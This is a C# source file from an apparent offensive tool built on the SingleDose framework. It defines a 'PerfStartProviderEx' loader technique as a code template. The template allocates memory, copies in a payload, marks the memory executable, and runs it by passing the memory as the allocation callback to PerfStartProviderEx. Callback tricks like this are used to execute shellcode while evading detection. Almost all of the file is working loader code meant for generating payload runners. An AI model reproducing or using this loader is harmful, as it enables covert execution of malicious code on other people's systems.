using SingleDose.Techniques;
using System.Collections.Generic;

namespace PoisonTendy.Techniques.Loaders
{
    internal class PerfStartProviderEx : ITechnique
    {
        bool ITechnique.IsLoader => true;

        bool ITechnique.IsUnsafe => false;

        string ITechnique.TechniqueName => "PerfStartProviderEx";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "PerfStartProviderEx", "PerfStopProvider" };

        List<string> ITechnique.Prerequisites => null;
        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            Guid ProviderGuid = Guid.NewGuid();

            PERF_PROVIDER_CONTEXT sPPC = new PERF_PROVIDER_CONTEXT();
            sPPC.MemAllocRoutine = hAlloc;
            sPPC.ContextSize = (uint)Marshal.SizeOf(sPPC);

            IntPtr hProvider = IntPtr.Zero;
            PerfStartProviderEx(ref ProviderGuid, ref sPPC, out hProvider);

            PerfStopProvider(hProvider);
        }
        {{ARGS}}

        struct PERF_PROVIDER_CONTEXT
        {
            public uint ContextSize;
            public uint Reserved;
            public IntPtr ControlCallback;
            public IntPtr MemAllocRoutine;
            public IntPtr MemFreeRoutine;
            public IntPtr pMemContext;
        }
        
        {{INVOKE}}
    }
}";
    }
}
